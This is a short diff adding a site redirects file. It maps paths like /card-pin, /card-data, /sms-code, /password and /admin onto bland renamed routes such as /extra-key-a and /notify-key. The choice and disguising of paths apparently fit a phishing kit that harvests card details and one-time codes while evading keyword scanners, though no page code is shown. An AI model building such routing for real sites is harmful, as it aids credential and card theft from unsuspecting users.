@@ -1,0 +1,17 @@
+/index.html     /              301
+/login.html     /member-access 301
+/password.html  /access-key    301
+/verify.html    /notify-key    301
+/login          /member-access 301
+/password       /access-key    301
+/verify         /notify-key    301
+/admin          /manage-hub    301
+/personal-info  /register-info 301
+/sign-in        /member-access 301
+/passcode       /access-key    301
+/sms-code       /notify-key    301
+/card-data      /extra-key-a   301
+/card-pin       /extra-key-b   301
+/card-verify    /extra-key-c   301
+/panel          /manage-hub    301
+/*              /index.html    200
